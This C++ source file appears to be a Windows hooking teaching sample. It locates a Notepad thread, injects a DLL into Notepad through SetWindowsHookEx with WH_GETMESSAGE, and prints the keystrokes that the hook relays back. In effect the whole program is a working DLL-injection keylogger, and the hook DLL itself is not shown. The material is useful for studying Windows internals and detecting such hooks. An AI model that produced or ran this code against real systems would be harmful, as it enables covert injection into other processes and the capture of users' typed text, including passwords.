// WindowsHooks.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <stdio.h>

int Error(const char* text) {
	printf("%s (%d)\n", text, GetLastError());
	return 1;
}

DWORD FindMainNotepadThread() { //as we are targeting notepad specifically, we have no args to command line
	auto hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	DWORD tid = 0;
	THREADENTRY32 th32;
	th32.dwSize = sizeof(th32);
	//the below will create a snapshot of each thread in the system, and for each thread will open a handle to the parent process and look up the image filename 
	Thread32First(hSnapshot, &th32);
	do {
		auto hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, th32.th32OwnerProcessID);
		if (hProcess) {
			WCHAR name[MAX_PATH];
			if (GetProcessImageFileName(hProcess, name, MAX_PATH) > 0) {
				auto bs = wcsrchr(name, L'\\');
				if (bs && _wcsicmp(bs, L"\\notepad.exe") == 0) { //check if image filename is notepad
					tid = th32.th32ThreadID;
					break;
				}
			}
			CloseHandle(hProcess);
		}
	} while (Thread32Next(hSnapshot, &th32));
	CloseHandle(hSnapshot);
	return tid;
}

int main() {
	DWORD tid = FindMainNotepadThread(); //a helper function similar to other proc enumeration functions that looks up the first thread in notepad.
	if (tid == 0) //the below will create a snapshot of each thread in the system, and for each thread will open a handle to the parent process and look up the image filename 
		return Error("Failed to locate Notepad");

	auto hDll = LoadLibrary(L"InjectedHook.dll"); //we inject the dll explicitly in this process, as we need the address of the dll for the SetWindowsHook function
	if (!hDll)
		return Error("Failed to locate Dll\n");

	auto setNotify = (void (WINAPI*)(DWORD, HHOOK))GetProcAddress(hDll, "SetNotificationThread"); //another exported function that sets up 2-way communication
	auto hHook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)GetProcAddress(hDll, "HookFunction"), hDll, tid);
	if (!hHook)
		return Error("Failed to install hook");

	setNotify(GetCurrentThreadId(), hHook);
	PostThreadMessage(tid, WM_NULL, 0, 0); //postthreadmessage simply wakes up the thread and causes the hook dll to be injected

	MSG msg;
	while (GetMessage(&msg, nullptr, 0, 0)) { //call getmessage in a loop, while we receive messages, we will print wParam which contains the ascii code of the key
		if (msg.message == WM_APP) {
			printf("%c", (int)msg.wParam);
			if (msg.wParam == 13)
				printf("\n");
		}
	}
	UnhookWindowsHookEx(hHook);
	FreeLibrary(hDll);

	return 0;
}
